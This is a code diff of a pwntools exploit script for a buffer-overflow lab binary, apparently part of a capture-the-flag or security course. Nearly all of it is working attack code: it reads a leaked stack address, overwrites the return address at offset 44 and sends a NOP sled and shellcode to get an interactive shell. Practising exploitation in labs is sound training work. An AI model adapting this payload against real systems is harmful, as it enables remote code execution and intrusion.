@@ -1,18 +1,35 @@
-from pwn import *
+#!/usr/bin/env python3
+import pwn
+import vpn_conf
+import sys
+
+HOST = vpn_conf.HOST
+PORT = int(vpn_conf.BASE_PORT + 2)
+EXE_FILENAME = "./bof101_x86"
+OFFSET_RIP = 44
+# HOW TO FIND FIND THE OFFSET
+# pattern = cyclic(100)
+# io = process(bin)
+# io.sendline(pattern)
+# offset = cyclic_find(0x6161616c)
+
+
+def start():
+    print(sys.argv)
+    if sys.argv[1] == "remote":
+        return pwn.remote(HOST, PORT)
+    return pwn.process(EXE_FILENAME)
+
 
 if __name__ == "__main__":
-
-    bin = remote('192.168.20.1', 5101)
-    
-    # HOW TO FIND FIND THE OFFSET 
-    # pattern = cyclic(100) 
-    # io = process(bin)
-    # io.sendline(pattern)
-    # offset = cyclic_find(0x6161616c)
-    # print(offset)
-    
-    offset = 44
-    shellcode = asm(shellcraft.sh())
-    payload = b'A' * offset + asm("nop") * 100 + shellcode
-    bin.sendline(payload)
-    
+    io = start()
+    leaked_address = io.recvuntil(b"&x=")
+    leaked_address = io.recvline().strip().decode()
+    print(f"LEAKED_ADDRESS ---------{leaked_address}---------")
+    io.sendline(
+        b"a" * OFFSET_RIP
+        + pwn.p64(int(leaked_address, 16))
+        + pwn.asm("nop") * 50
+        + pwn.asm(pwn.shellcraft.sh())
+    )
+    io.interactive()
